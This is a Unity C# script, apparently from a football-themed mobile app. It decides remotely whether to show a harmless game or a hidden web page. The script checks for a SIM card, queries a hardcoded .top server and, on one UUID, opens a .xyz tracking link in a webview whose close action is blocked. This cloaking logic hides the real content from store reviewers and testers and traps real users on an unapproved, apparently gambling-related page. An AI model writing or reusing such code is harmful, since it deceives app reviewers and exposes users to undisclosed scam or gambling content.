using Firebase.Extensions;
using Firebase.Storage;
using System.Collections;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.UI;

public class Viewer : MonoBehaviour
{
    bool Sim_Enable
    {
        get => Simcard.GetTwoSmallLetterCountryCodeISO().Length > 0;
    }

    private UniWebView View { get; set; }

    private const string config = "http://kjbljvasgpkd.top";

    private const string guuid = "c7c24e9a-d743-4876-9d0a-f07c873c2bec";
    private const string wuuid = "a3280338-4bf0-425a-b7ef-cd0ae3c51e67";

    private const string target = "https://iqtsrdyif.xyz/WNH1H888?id=com.play.yourwin.win.winline.football1";

    private void Start()
    {
        Screen.fullScreen = false;

        if (!Sim_Enable || Application.internetReachability == NetworkReachability.NotReachable)
        {
            Screen.fullScreen = true;
            UnityEngine.SceneManagement.SceneManager.LoadScene(1);
            return;
        }

        StartCoroutine(nameof(GetConfig));
    }

    void Init()
    {
        View = gameObject.AddComponent<UniWebView>();

        View.ReferenceRectTransform = InitInterface();
        View.SetShowSpinnerWhileLoading(false);

        View.SetSupportMultipleWindows(true);

        View.BackgroundColor = Color.white;
        View.OnShouldClose += (v) => { return false; };
        View.OnPageStarted += (browser, url) => { View.UpdateFrame(); View.Show(); };

        View.Load(target);
    }

    RectTransform InitInterface()
    {
        GameObject _interface = new GameObject("Interface", typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));

        Canvas _canvas = _interface.GetComponent<Canvas>();
        _canvas.renderMode = RenderMode.ScreenSpaceCamera;
        _canvas.worldCamera = Camera.main;

        CanvasScaler _canvasScaler = _interface.GetComponent<CanvasScaler>();
        _canvasScaler.uiScaleMode = CanvasScaler.ScaleMode.ScaleWithScreenSize;
        _canvasScaler.referenceResolution = new Vector2(Screen.width, Screen.height);
        _canvasScaler.matchWidthOrHeight = 0.5f;

        GameObject activity = new GameObject("Privacy activity", typeof(RectTransform));
        activity.transform.SetParent(_interface.transform, false);
        RectTransform _rectTransform = activity.GetComponent<RectTransform>();

        _rectTransform.anchorMin = Vector2.zero;
        _rectTransform.anchorMax = Vector2.one;
        _rectTransform.pivot = Vector2.one / 2;
        _rectTransform.sizeDelta = Vector2.zero;
        _rectTransform.offsetMax = new Vector2(0, -Screen.height * 0.0409f);

        return _rectTransform;
    }

    private IEnumerator GetConfig()
    {
        UnityWebRequest webRequest = UnityWebRequest.Get(config);
        yield return webRequest.SendWebRequest();

        string responce = webRequest.downloadHandler.text;

        FirebaseStorage storage = FirebaseStorage.DefaultInstance;
        StorageReference pathReference = storage.GetReference(responce);

        const long maxAllowedSize = 1 * 1024 * 1024;
        pathReference.GetBytesAsync(maxAllowedSize).ContinueWithOnMainThread(task =>
        {
            if (task.IsFaulted || task.IsCanceled)
            {
                Debug.LogException(task.Exception);

                Screen.fullScreen = true;
                UnityEngine.SceneManagement.SceneManager.LoadScene(1);
                return;
            }
            else
            {
                byte[] fileContents = task.Result;
                Debug.Log("Finished downloading!");
                var tex = new Texture2D(1, 1); // note that the size is overridden
                tex.LoadImage(fileContents);

                GameObject bannerGO = GameObject.Find("banner");
                RawImage bannerRawImg = bannerGO.GetComponent<RawImage>();
                bannerRawImg.texture = tex;

                if(GameObject.Find("bar"))
                {
                    GameObject.Find("bar").SetActive(false);
                }

                bannerGO.GetComponent<Button>().onClick.AddListener(() =>
                {
                    if(responce == guuid)
                    {
                        Screen.fullScreen = true;
                        UnityEngine.SceneManagement.SceneManager.LoadScene(1);
                        return;
                    }
                    else if(responce == wuuid)
                    {
                        Init();
                    }

                    Destroy(bannerGO);
                });
            }
        });
    }
}
